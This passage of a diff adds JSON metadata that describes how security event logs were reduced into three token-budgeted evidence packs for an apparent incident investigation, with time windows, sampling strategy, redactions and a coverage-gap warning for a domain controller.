+    "evidence_pack_digest": "15e8e5f3b541eaecd1457a6801fedc7d098ec32359e4872512dc78674b18a5d8",
+    "pack_count": 3,
+    "packs": [
+      {
+        "index": 0,
+        "rows": 4200,
+        "estimated_tokens": 210000,
+        "time_range": {
+          "start_utc": "2026-04-17T12:30:00.0000000Z",
+          "end_utc": "2026-04-17T14:00:00.0000000Z"
+        },
+        "selection_strategy": "high-severity-window"
+      },
+      {
+        "index": 1,
+        "rows": 5100,
+        "estimated_tokens": 255000,
+        "time_range": {
+          "start_utc": "2026-04-17T14:00:00.0000000Z",
+          "end_utc": "2026-04-17T19:00:00.0000000Z"
+        },
+        "selection_strategy": "high-severity-window"
+      },
+      {
+        "index": 2,
+        "rows": 3200,
+        "estimated_tokens": 160000,
+        "time_range": {
+          "start_utc": "2026-04-10T00:00:00.0000000Z",
+          "end_utc": "2026-04-17T12:30:00.0000000Z"
+        },
+        "selection_strategy": "stratified-sample"
+      }
+    ],
+    "reduction_strategy": "Rows within +/-90 minutes of any client detection >= medium severity were prioritized and included at 100%; the remaining lower-severity history was stratified-sampled to fit the token budget.",
+    "rows_omitted": 35710,
+    "redactions_applied": [
+      "local-part of non-privileged email addresses masked",
+      "no redactions applied to hostnames or account names"
+    ],
+    "warnings": [
+      "WIN-DC01 03:00-04:00 UTC window fell outside all three packs and is represented only by a detection-engine summary (see F-007, analytic_gaps)."
+    ],
+    "repair_attempts": 0
+  }
+}
